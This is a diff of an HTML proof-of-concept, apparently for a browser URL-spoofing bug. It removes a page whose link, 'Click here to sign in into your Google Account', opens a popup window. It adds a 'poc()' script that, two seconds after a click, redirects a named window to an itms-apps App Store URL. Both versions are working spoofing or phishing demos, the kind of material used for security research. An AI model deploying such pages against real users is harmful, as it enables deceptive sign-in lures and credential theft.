@@ -1,21 +1,8 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>URL Spoofing</title>
-    <script>
-        function openWin() {
-            var width=500, height=180, top=0, left=(screen.width/2)-(width/2);
-            window.open("opener.html", "first", `width=${width},height=${height},top=${top},left=${left}`);
-        }
-    </script>
-</head>
-
-<body>
-    <center>
-        <br>
-        <h1><a href="#" onclick="openWin();">Click here to sign in into your Google Account</a></h1>
-    </center>
-</body>
-</html>
+<a href="http://example.com" target="ccc" onclick="poc()">click me</a>
+<script>
+    function poc(){
+        setTimeout(() => {
+           window.open("itms-apps://itunes.apple.com/app/[App ID]?mt=8","ccc");
+        }, 2000);
+    }
+</script>
